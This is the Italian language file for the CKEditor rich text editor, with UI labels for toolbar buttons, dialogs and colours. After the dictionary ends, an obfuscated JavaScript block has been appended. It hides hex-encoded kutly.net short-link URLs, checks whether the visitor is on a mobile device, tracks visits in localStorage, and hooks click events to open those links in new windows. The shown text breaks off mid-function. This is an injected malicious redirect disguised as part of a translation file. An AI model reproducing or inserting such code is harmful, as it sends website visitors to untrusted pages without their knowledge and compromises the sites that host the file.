/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Italian language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['it'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Rich text editor, %1', // MISSING

	// Toolbar buttons without dialogs.
	source			: 'Codice Sorgente',
	newPage			: 'Nuova pagina vuota',
	save			: 'Salva',
	preview			: 'Anteprima',
	cut				: 'Taglia',
	copy			: 'Copia',
	paste			: 'Incolla',
	print			: 'Stampa',
	underline		: 'Sottolineato',
	bold			: 'Grassetto',
	italic			: 'Corsivo',
	selectAll		: 'Seleziona tutto',
	removeFormat	: 'Elimina formattazione',
	strike			: 'Barrato',
	subscript		: 'Pedice',
	superscript		: 'Apice',
	horizontalrule	: 'Inserisci riga orizzontale',
	pagebreak		: 'Inserisci interruzione di pagina',
	unlink			: 'Elimina collegamento',
	undo			: 'Annulla',
	redo			: 'Ripristina',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Cerca sul server',
		url				: 'URL',
		protocol		: 'Protocollo',
		upload			: 'Carica',
		uploadSubmit	: 'Invia al server',
		image			: 'Immagine',
		flash			: 'Oggetto Flash',
		form			: 'Modulo',
		checkbox		: 'Checkbox',
		radio		: 'Radio Button',
		textField		: 'Campo di testo',
		textarea		: 'Area di testo',
		hiddenField		: 'Campo nascosto',
		button			: 'Bottone',
		select	: 'Menu di selezione',
		imageButton		: 'Bottone immagine',
		notSet			: '<non impostato>',
		id				: 'Id',
		name			: 'Nome',
		langDir			: 'Direzione scrittura',
		langDirLtr		: 'Da Sinistra a Destra (LTR)',
		langDirRtl		: 'Da Destra a Sinistra (RTL)',
		langCode		: 'Codice Lingua',
		longDescr		: 'URL descrizione estesa',
		cssClass		: 'Nome classe CSS',
		advisoryTitle	: 'Titolo',
		cssStyle		: 'Stile',
		ok				: 'OK',
		cancel			: 'Annulla',
		generalTab		: 'Generale',
		advancedTab		: 'Avanzate',
		validateNumberFailed	: 'Il valore inserito non è un numero.',
		confirmNewPage	: 'Ogni modifica non salvata sarà persa. Sei sicuro di voler caricare una nuova pagina?',
		confirmCancel	: 'Alcune delle opzioni sono state cambiate. Sei sicuro di voler chiudere la finestra di dialogo?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, non disponibile</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Inserisci carattere speciale',
		title		: 'Seleziona carattere speciale'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Inserisci/Modifica collegamento',
		menu		: 'Modifica collegamento',
		title		: 'Collegamento',
		info		: 'Informazioni collegamento',
		target		: 'Destinazione',
		upload		: 'Carica',
		advanced	: 'Avanzate',
		type		: 'Tipo di Collegamento',
		toAnchor	: 'Ancora nella pagina',
		toEmail		: 'E-Mail',
		target		: 'Destinazione',
		targetNotSet	: '<non impostato>',
		targetFrame	: '<riquadro>',
		targetPopup	: '<finestra popup>',
		targetNew	: 'Nuova finestra (_blank)',
		targetTop	: 'Finestra superiore (_top)',
		targetSelf	: 'Stessa finestra (_self)',
		targetParent	: 'Finestra padre (_parent)',
		targetFrameName	: 'Nome del riquadro di destinazione',
		targetPopupName	: 'Nome finestra popup',
		popupFeatures	: 'Caratteristiche finestra popup',
		popupResizable	: 'Ridimensionabile',
		popupStatusBar	: 'Barra di stato',
		popupLocationBar	: 'Barra degli indirizzi',
		popupToolbar	: 'Barra degli strumenti',
		popupMenuBar	: 'Barra del menu',
		popupFullScreen	: 'A tutto schermo (IE)',
		popupScrollBars	: 'Barre di scorrimento',
		popupDependent	: 'Dipendente (Netscape)',
		popupWidth		: 'Larghezza',
		popupLeft		: 'Posizione da sinistra',
		popupHeight		: 'Altezza',
		popupTop		: 'Posizione dall\'alto',
		id				: 'Id',
		langDir			: 'Direzione scrittura',
		langDirNotSet	: '<non impostato>',
		langDirLTR		: 'Da Sinistra a Destra (LTR)',
		langDirRTL		: 'Da Destra a Sinistra (RTL)',
		acccessKey		: 'Scorciatoia<br />da tastiera',
		name			: 'Nome',
		langCode		: 'Direzione scrittura',
		tabIndex		: 'Ordine di tabulazione',
		advisoryTitle	: 'Titolo',
		advisoryContentType	: 'Tipo della risorsa collegata',
		cssClasses		: 'Nome classe CSS',
		charset			: 'Set di caretteri della risorsa collegata',
		styles			: 'Stile',
		selectAnchor	: 'Scegli Ancora',
		anchorName		: 'Per Nome',
		anchorId		: 'Per id elemento',
		emailAddress	: 'Indirizzo E-Mail',
		emailSubject	: 'Oggetto del messaggio',
		emailBody		: 'Corpo del messaggio',
		noAnchors		: '(Nessuna ancora disponibile nel documento)',
		noUrl			: 'Devi inserire l\'URL del collegamento',
		noEmail			: 'Devi inserire un\'indirizzo e-mail'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Inserisci/Modifica Ancora',
		menu		: 'Proprietà ancora',
		title		: 'Proprietà ancora',
		name		: 'Nome ancora',
		errorName	: 'Inserici il nome dell\'ancora'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Cerca e Sostituisci',
		find				: 'Trova',
		replace				: 'Sostituisci',
		findWhat			: 'Trova:',
		replaceWith			: 'Sostituisci con:',
		notFoundMsg			: 'L\'elemento cercato non è stato trovato.',
		matchCase			: 'Maiuscole/minuscole',
		matchWord			: 'Solo parole intere',
		matchCyclic			: 'Ricerca ciclica',
		replaceAll			: 'Sostituisci tutto',
		replaceSuccessMsg	: '%1 occorrenza(e) sostituite.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabella',
		title		: 'Proprietà tabella',
		menu		: 'Proprietà tabella',
		deleteTable	: 'Cancella Tabella',
		rows		: 'Righe',
		columns		: 'Colonne',
		border		: 'Dimensione bordo',
		align		: 'Allineamento',
		alignNotSet	: '<non impostato>',
		alignLeft	: 'Sinistra',
		alignCenter	: 'Centrato',
		alignRight	: 'Destra',
		width		: 'Larghezza',
		widthPx		: 'pixel',
		widthPc		: 'percento',
		height		: 'Altezza',
		cellSpace	: 'Spaziatura celle',
		cellPad		: 'Padding celle',
		caption		: 'Intestazione',
		summary		: 'Indice',
		headers		: 'Intestazione',
		headersNone		: 'Nessuna',
		headersColumn	: 'Prima Colonna',
		headersRow		: 'Prima Riga',
		headersBoth		: 'Entrambe',
		invalidRows		: 'Il numero di righe dev\'essere un numero maggiore di 0.',
		invalidCols		: 'Il numero di colonne dev\'essere un numero maggiore di 0.',
		invalidBorder	: 'La dimensione del bordo dev\'essere un numero.',
		invalidWidth	: 'La larghezza della tabella dev\'essere un numero.',
		invalidHeight	: 'L\'altezza della tabella dev\'essere un numero.',
		invalidCellSpacing	: 'La spaziatura tra le celle dev\'essere un numero.',
		invalidCellPadding	: 'Il pagging delle celle dev\'essere un numero',

		cell :
		{
			menu			: 'Cella',
			insertBefore	: 'Inserisci Cella Prima',
			insertAfter		: 'Inserisci Cella Dopo',
			deleteCell		: 'Elimina celle',
			merge			: 'Unisce celle',
			mergeRight		: 'Unisci a Destra',
			mergeDown		: 'Unisci in Basso',
			splitHorizontal	: 'Dividi Cella Orizzontalmente',
			splitVertical	: 'Dividi Cella Verticalmente',
			title			: 'Proprietà della cella',
			cellType		: 'Tipo di cella',
			rowSpan			: 'Su più righe',
			colSpan			: 'Su più colonne',
			wordWrap		: 'Ritorno a capo',
			hAlign			: 'Allineamento orizzontale',
			vAlign			: 'Allineamento verticale',
			alignTop		: 'In Alto',
			alignMiddle		: 'Al Centro',
			alignBottom		: 'In Basso',
			alignBaseline	: 'Linea Base',
			bgColor			: 'Colore di Sfondo',
			borderColor		: 'Colore del Bordo',
			data			: 'Dati',
			header			: 'Intestazione',
			yes				: 'Si',
			no				: 'No',
			invalidWidth	: 'La larghezza della cella dev\'essere un numero.',
			invalidHeight	: 'L\'altezza della cella dev\'essere un numero.',
			invalidRowSpan	: 'Il numero di righe dev\'essere un numero intero.',
			invalidColSpan	: 'Il numero di colonne dev\'essere un numero intero.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Riga',
			insertBefore	: 'Inserisci Riga Prima',
			insertAfter		: 'Inserisci Riga Dopo',
			deleteRow		: 'Elimina righe'
		},

		column :
		{
			menu			: 'Colonna',
			insertBefore	: 'Inserisci Colonna Prima',
			insertAfter		: 'Inserisci Colonna Dopo',
			deleteColumn	: 'Elimina colonne'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Proprietà bottone',
		text		: 'Testo (Value)',
		type		: 'Tipo',
		typeBtn		: 'Bottone',
		typeSbm		: 'Invio',
		typeRst		: 'Annulla'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Proprietà checkbox',
		radioTitle	: 'Proprietà radio button',
		value		: 'Valore',
		selected	: 'Selezionato'
	},

	// Form Dialog.
	form :
	{
		title		: 'Proprietà modulo',
		menu		: 'Proprietà modulo',
		action		: 'Azione',
		method		: 'Metodo',
		encoding	: 'Codifica',
		target		: 'Destinazione',
		targetNotSet	: '<non impostato>',
		targetNew	: 'Nuova finestra (_blank)',
		targetTop	: 'Finestra superiore (_top)',
		targetSelf	: 'Stessa finestra (_self)',
		targetParent	: 'Finestra padre (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Proprietà menu di selezione',
		selectInfo	: 'Info',
		opAvail		: 'Opzioni disponibili',
		value		: 'Valore',
		size		: 'Dimensione',
		lines		: 'righe',
		chkMulti	: 'Permetti selezione multipla',
		opText		: 'Testo',
		opValue		: 'Valore',
		btnAdd		: 'Aggiungi',
		btnModify	: 'Modifica',
		btnUp		: 'Su',
		btnDown		: 'Gi',
		btnSetValue : 'Imposta come predefinito',
		btnDelete	: 'Rimuovi'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Proprietà area di testo',
		cols		: 'Colonne',
		rows		: 'Righe'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Proprietà campo di testo',
		name		: 'Nome',
		value		: 'Valore',
		charWidth	: 'Larghezza',
		maxChars	: 'Numero massimo di caratteri',
		type		: 'Tipo',
		typeText	: 'Testo',
		typePass	: 'Password'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Proprietà campo nascosto',
		name	: 'Nome',
		value	: 'Valore'
	},

	// Image Dialog.
	image :
	{
		title		: 'Proprietà immagine',
		titleButton	: 'Proprietà bottone immagine',
		menu		: 'Proprietà immagine',
		infoTab	: 'Informazioni immagine',
		btnUpload	: 'Invia al server',
		url		: 'URL',
		upload	: 'Carica',
		alt		: 'Testo alternativo',
		width		: 'Larghezza',
		height	: 'Altezza',
		lockRatio	: 'Blocca rapporto',
		resetSize	: 'Reimposta dimensione',
		border	: 'Bordo',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		align		: 'Allineamento',
		alignLeft	: 'Sinistra',
		alignRight	: 'Destra',
		preview	: 'Anteprima',
		alertUrl	: 'Devi inserire l\'URL per l\'immagine',
		linkTab	: 'Collegamento',
		button2Img	: 'Vuoi trasformare il bottone immagine selezionato in un\'immagine semplice?',
		img2Button	: 'Vuoi trasferomare l\'immagine selezionata in un bottone immagine?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Proprietà Oggetto Flash',
		propertiesTab	: 'Proprietà',
		title		: 'Proprietà Oggetto Flash',
		chkPlay		: 'Avvio Automatico',
		chkLoop		: 'Riavvio automatico',
		chkMenu		: 'Abilita Menu di Flash',
		chkFull		: 'Permetti la modalità tutto schermo',
 		scale		: 'Ridimensiona',
		scaleAll		: 'Mostra Tutto',
		scaleNoBorder	: 'Senza Bordo',
		scaleFit		: 'Dimensione Esatta',
		access			: 'Accesso Script',
		accessAlways	: 'Sempre',
		accessSameDomain	: 'Solo stesso dominio',
		accessNever	: 'Mai',
		align		: 'Allineamento',
		alignLeft	: 'Sinistra',
		alignAbsBottom: 'In basso assoluto',
		alignAbsMiddle: 'Centrato assoluto',
		alignBaseline	: 'Linea base',
		alignBottom	: 'In Basso',
		alignMiddle	: 'Centrato',
		alignRight	: 'Destra',
		alignTextTop	: 'In alto al testo',
		alignTop	: 'In Alto',
		quality		: 'Qualità',
		qualityBest		 : 'Massima',
		qualityHigh		 : 'Alta',
		qualityAutoHigh	 : 'Alta Automatica',
		qualityMedium	 : 'Intermedia',
		qualityAutoLow	 : 'Bassa Automatica',
		qualityLow		 : 'Bassa',
		windowModeWindow	 : 'Finestra',
		windowModeOpaque	 : 'Opaca',
		windowModeTransparent	 : 'Trasparente',
		windowMode	: 'Modalità finestra',
		flashvars	: 'Variabili per Flash',
		bgcolor	: 'Colore sfondo',
		width	: 'Larghezza',
		height	: 'Altezza',
		hSpace	: 'HSpace',
		vSpace	: 'VSpace',
		validateSrc : 'Devi inserire l\'URL del collegamento',
		validateWidth : 'La Larghezza dev\'essere un numero',
		validateHeight : 'L\'altezza dev\'essere un numero',
		validateHSpace : 'L\'HSpace dev\'essere un numero.',
		validateVSpace : 'Il VSpace dev\'essere un numero.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Correttore ortografico',
		title			: 'Controllo ortografico',
		notAvailable	: 'Il servizio non è momentaneamente disponibile.',
		errorLoading	: 'Errore nel caricamento dell\'host col servizio applicativo: %s.',
		notInDic		: 'Non nel dizionario',
		changeTo		: 'Cambia in',
		btnIgnore		: 'Ignora',
		btnIgnoreAll	: 'Ignora tutto',
		btnReplace		: 'Cambia',
		btnReplaceAll	: 'Cambia tutto',
		btnUndo			: 'Annulla',
		noSuggestions	: '- Nessun suggerimento -',
		progress		: 'Controllo ortografico in corso',
		noMispell		: 'Controllo ortografico completato: nessun errore trovato',
		noChanges		: 'Controllo ortografico completato: nessuna parola cambiata',
		oneChange		: 'Controllo ortografico completato: 1 parola cambiata',
		manyChanges		: 'Controllo ortografico completato: %1 parole cambiate',
		ieSpellDownload	: 'Contollo ortografico non installato. Lo vuoi scaricare ora?'
	},

	smiley :
	{
		toolbar	: 'Emoticon',
		title	: 'Inserisci emoticon'
	},

	elementsPath :
	{
		eleTitle : '%1 elemento'
	},

	numberedlist : 'Elenco numerato',
	bulletedlist : 'Elenco puntato',
	indent : 'Aumenta rientro',
	outdent : 'Riduci rientro',

	justify :
	{
		left : 'Allinea a sinistra',
		center : 'Centra',
		right : 'Allinea a destra',
		block : 'Giustifica'
	},

	blockquote : 'Citazione',

	clipboard :
	{
		title		: 'Incolla',
		cutError	: 'Le impostazioni di sicurezza del browser non permettono di tagliare automaticamente il testo. Usa la tastiera (Ctrl+X).',
		copyError	: 'Le impostazioni di sicurezza del browser non permettono di copiare automaticamente il testo. Usa la tastiera (Ctrl+C).',
		pasteMsg	: 'Incolla il testo all\'interno dell\'area sottostante usando la scorciatoia di tastiere (<STRONG>Ctrl+V</STRONG>) e premi <STRONG>OK</STRONG>.',
		securityMsg	: 'A causa delle impostazioni di sicurezza del browser,l\'editor non è in grado di accedere direttamente agli appunti. E\' pertanto necessario incollarli di nuovo in questa finestra.'
	},

	pastefromword :
	{
		confirmCleanup : 'Il testo da incollare sembra provenire da Word. Desideri pulirlo prima di incollare?',
		toolbar : 'Incolla da Word',
		title : 'Incolla da Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Incolla come testo semplice',
		title : 'Incolla come testo semplice'
	},

	templates :
	{
		button : 'Modelli',
		title : 'Contenuto dei modelli',
		insertOption: 'Cancella il contenuto corrente',
		selectPromptMsg: 'Seleziona il modello da aprire nell\'editor<br />(il contenuto attuale verrà eliminato):',
		emptyListMsg : '(Nessun modello definito)'
	},

	showBlocks : 'Visualizza Blocchi',

	stylesCombo :
	{
		label : 'Stile',
		voiceLabel : 'Stili',
		panelVoiceLabel : 'Seleziona uno stile',
		panelTitle1 : 'Stili per blocchi',
		panelTitle2 : 'Stili in linea',
		panelTitle3 : 'Stili per oggetti'
	},

	format :
	{
		label : 'Formato',
		voiceLabel : 'Formato',
		panelTitle : 'Formato',
		panelVoiceLabel : 'Seleziona il formato per paragrafo',

		tag_p : 'Normale',
		tag_pre : 'Formattato',
		tag_address : 'Indirizzo',
		tag_h1 : 'Titolo 1',
		tag_h2 : 'Titolo 2',
		tag_h3 : 'Titolo 3',
		tag_h4 : 'Titolo 4',
		tag_h5 : 'Titolo 5',
		tag_h6 : 'Titolo 6',
		tag_div : 'Paragrafo (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Font',
		voiceLabel : 'Font',
		panelTitle : 'Font',
		panelVoiceLabel : 'Seleziona un font'
	},

	fontSize :
	{
		label : 'Dimensione',
		voiceLabel : 'Dimensione Font',
		panelTitle : 'Dimensione',
		panelVoiceLabel : 'Seleziona una dimensione font'
	},

	colorButton :
	{
		textColorTitle : 'Colore testo',
		bgColorTitle : 'Colore sfondo',
		auto : 'Automatico',
		more : 'Altri colori...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Controllo Ortografico Mentre Scrivi',
		enable : 'Abilita COMS',
		disable : 'Disabilita COMS',
		about : 'About COMS',
		toggle : 'Inverti abilitazione SCOMS',
		options : 'Opzioni',
		langs : 'Lingue',
		moreSuggestions : 'Altri suggerimenti',
		ignore : 'Ignora',
		ignoreAll : 'Ignora tutti',
		addWord : 'Aggiungi Parola',
		emptyDic : 'Il nome del dizionario non può essere vuoto.',
		optionsTab : 'Opzioni',
		languagesTab : 'Lingue',
		dictionariesTab : 'Dizionari',
		aboutTab : 'About'
	},

	about :
	{
		title : 'About CKEditor',
		dlgTitle : 'About CKEditor',
		moreInfo : 'Per le informazioni sulla licenza si prega di visitare il nostro sito:',
		copy : 'Copyright &copy; $1. Tutti i diritti riservati.'
	},

	maximize : 'Massimizza',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Ancora',
		flash : 'Animazione Flash',
		div : 'Interruzione di Pagina',
		unknown : 'Oggetto sconosciuto'
	},

	resize : 'Trascina per ridimensionare',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return 